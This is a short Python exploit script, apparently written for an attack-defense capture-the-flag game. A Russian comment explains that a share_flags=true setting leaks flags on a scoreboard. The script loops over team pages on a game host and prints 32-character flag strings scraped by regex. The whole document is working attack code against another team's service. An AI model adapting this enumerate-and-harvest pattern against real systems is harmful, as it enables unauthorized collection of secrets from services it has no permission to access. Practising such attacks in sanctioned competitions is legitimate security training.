#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# Есть конфиг с share_flags=true, приводящий к их выводу на борде

import requests
import re

URL = "http://6.0.0.1/team/"

def sploit():
    for i in range(1,12):
        r = requests.get(URL+str(i))
        print(re.findall(r"[A-Z0-9]{31}=",r.text)[0:4],flush=True)

sploit()
